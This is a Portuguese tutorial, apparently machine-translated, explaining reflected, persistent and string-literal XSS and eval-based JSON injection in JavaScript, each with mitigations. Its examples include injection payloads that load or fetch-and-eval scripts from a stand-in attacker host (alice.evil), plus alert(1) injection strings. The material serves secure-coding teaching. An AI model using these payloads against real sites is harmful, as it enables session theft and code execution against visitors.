Esta é uma coleção de problemas comuns de segurança de JavaScript, como XSS e injeção eval. Esta coleção também contém como mitigar esses problemas de segurança.

Scripts entre sites refletidos (XSS) #

Digamos que Joe possui um site que permite que você faça logon, veja vídeos de filhotes e salve-os em sua conta.

Sempre que um usuário pesquisa nesse site, ele é redirecionado para https://example.com/search?q=brown+puppies.

Se a pesquisa de um usuário não corresponder a nada, ele verá uma mensagem nas linhas de:

Sua busca (filhotes marrons), não correspondeu a nada. Tente novamente.

No back-end, essa mensagem é exibida assim:

if(!searchResults){
    webPage += "<div>Your search (<b>" + searchQuery + "</b>), didn't match anything. Try again.";
}

No entanto, quando Alice procura por <h1>títulos</h1>, ela obtém isso de volta:

Sua pesquisa (

cabeçalhos

) não correspondeu a nada. Tente novamente.

HTML bruto:

Your search (<b><h1>headings</h1></b>) didn't match anything. Try again.

Depois que Alice procura por <script>alert(1)</script>, ela vê:

Sua pesquisa (), não correspondeu a nada. Tente novamente.

E:

Than Alice procura por <script src = "https://alice.evil/puppy_xss.js></script>cachorrinhos realmente fofos e copia o link em sua barra de endereços, e então envia um e-mail para Bob:

Bob,

Quando pesquiso por filhotes fofos, nada acontece!

Então Alice consegue com sucesso que Bob execute seu script enquanto Bob está conectado à sua conta.

Mitigação: #

  1. Escape de todos os colchetes angulares nas pesquisas antes de retornar o termo de pesquisa quando nenhum resultado for encontrado.
  2. Não retorne o termo de pesquisa quando nenhum resultado for encontrado.
  3. Adicione uma Política de Segurança de Conteúdo que se recuse a carregar conteúdo ativo de outros domínios

Scripts entre sites persistentes (XSS) #

Digamos que Bob possui um site social que permite aos usuários personalizar seus perfis.

Alice acessa o site de Bob, cria uma conta e acessa as configurações de seu perfil. Ela define a descrição de seu perfil como “Na verdade, estou com preguiça de escrever algo aqui.”

Quando seus amigos visualizam seu perfil, este código é executado no servidor:

if(viewedPerson.profile.description){
    page += "<div>" + viewedPerson.profile.description + "</div>";
}else{
    page += "<div>This person doesn't have a profile description.</div>";
}

Resultando neste HTML:

<div>I'm actually too lazy to write something here.</div>

Than Alice define sua descrição de perfil para <b>Eu gosto de HTML</b>. Quando ela visita seu perfil, em vez de ver

<b>Gosto de HTML</b>

ela vê

Gosto de HTML

Então Alice define seu perfil para

<script src = "https://alice.evil/profile_xss.js"></script>I'm actually too lazy to write something here.

Sempre que alguém visita o perfil dela, o script de Alice é executado no site de Bob enquanto está conectado como sua conta.

Mitigação #

  1. Fuja dos colchetes nas descrições dos perfis, etc.
  2. Armazene as descrições do perfil em um arquivo de texto simples que é então obtido com um script que adiciona a descrição via .innerText
  3. Adicione uma Política de Segurança de Conteúdo que se recuse a carregar conteúdo ativo de outros domínios

Scripts persistentes entre sites de literais de string JavaScript #

Digamos que Bob possui um site que permite postar mensagens públicas.

As mensagens são carregadas por um script que se parece com isso:

addMessage("Message 1");
addMessage("Message 2");
addMessage("Message 3");
addMessage("Message 4");
addMessage("Message 5");
addMessage("Message 6");

A função addMessage adiciona uma mensagem postada ao DOM. No entanto, em um esforço para evitar XSS, qualquer HTML nas mensagens postadas tem escape.

O script é gerado no servidor assim:

for(var i = 0; i < messages.length; i++){
    script += "addMessage(\"" + messages[i] + "\");";
}

Então Alice posta uma mensagem que diz: Minha mãe disse: "A vida é boa. A torta torna melhor. ". Do que quando ela visualiza a mensagem, em vez de ver sua mensagem, ela vê um erro no console:

Uncaught SyntaxError: missing ) after argument list

Por quê? Porque o script gerado se parece com isso:

addMessage("My mom said: "Life is good. Pie makes it better. "");

Isso é um erro de sintaxe. Do que Alice posta:

I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);//

Em seguida, o script gerado se parece com:

addMessage("I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);//");

Isso adiciona a mensagem I like pie, mas também baixa e executa https://alice.evil/js_xss.js sempre que alguém visita o site de Bob.

Mitigação: #

  1. Passe a mensagem postada em [JSON.stringify()](https://www.wikiod.com/pt/javascript/json#Serializando um valor)
  2. Em vez de construir um script dinamicamente, crie um arquivo de texto simples contendo todas as mensagens que são buscadas posteriormente pelo script
  3. Adicione uma Política de Segurança de Conteúdo que se recuse a carregar conteúdo ativo de outros domínios

Por que scripts de outras pessoas podem prejudicar seu site e seus visitantes #

Se você não acha que scripts maliciosos podem prejudicar seu site, você está errado. Aqui está uma lista do que um script malicioso pode fazer:

  1. Remova-se do DOM para que não possa ser rastreado
  2. Roubar os cookies de sessão dos usuários e permitir que o autor do script faça login como e se faça passar por eles
  3. Mostre um falso “Sua sessão expirou. Faça login novamente.” mensagem que envia a senha do usuário para o autor do script.
  4. Registre um service worker malicioso que executa um script malicioso em cada visita de página nesse site.
  5. Coloque um paywall falso exigindo que os usuários paguem dinheiro para acessar o site que na verdade vai para o autor do script.

Por favor, não pense que o XSS não prejudicará seu site e seus visitantes.

Injeção JSON avaliada #

Digamos que sempre que alguém visita uma página de perfil no site de Bob, o seguinte URL é buscado:

https://example.com/api/users/1234/profiledata.json

Com uma resposta como esta:

{
    "name": "Bob",
    "description": "Likes pie & security holes."
}

Então esses dados são analisados ​​e inseridos:

var data = eval("(" + resp + ")");
document.getElementById("#name").innerText = data.name;
document.getElementById("#description").innerText = data.description;

Parece bom, certo? Errado.

E se a descrição de alguém for “Gosta de XSS.”});alert(1);({“name”:“Alice”,“description”:“Gosta de XSS.`? Parece estranho, mas se for mal feito, a resposta será :

{
    "name": "Alice",
    "description": "Likes pie & security holes."});alert(1);({"name":"Alice","description":"Likes XSS."
}

E isso será avaliado:

({
    "name": "Alice",
    "description": "Likes pie & security holes."});alert(1);({"name":"Alice","description":"Likes XSS."
})

Se você não acha que isso é um problema, cole isso no seu console e veja o que acontece.

Mitigação #

  • Use JSON.parse em vez de eval para obter JSON. Em geral, não use eval, e definitivamente não use eval com algo que um usuário possa controlar. Eval cria um novo contexto de execução, criando um hit de desempenho.

  • Escape corretamente " e \ nos dados do usuário antes de colocá-los em JSON. Se você apenas escapar do ", isso acontecerá:

     Hello! \"});alert(1);({

Será convertido em:

   "Hello! \\"});alert(1);({"
Oops. Remember to escape both the `\` and `"`, or just use JSON.parse.
